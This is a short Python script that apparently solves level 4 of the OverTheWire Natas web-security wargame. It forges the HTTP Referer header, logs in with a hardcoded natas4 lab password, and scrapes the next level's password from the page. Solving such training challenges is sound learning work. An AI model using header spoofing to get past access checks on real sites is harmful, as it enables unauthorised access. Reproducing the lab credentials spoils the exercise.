#python2.7
import requests
import re
username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
url = 'http://%s.natas.labs.overthewire.org/' % username
response = requests.get(url, headers={'referer': 'http://natas5.natas.labs.overthewire.org/' } ,auth = (username, password))
content = response.text
#print content
print re.findall('natas5 is (.*)', content)[0]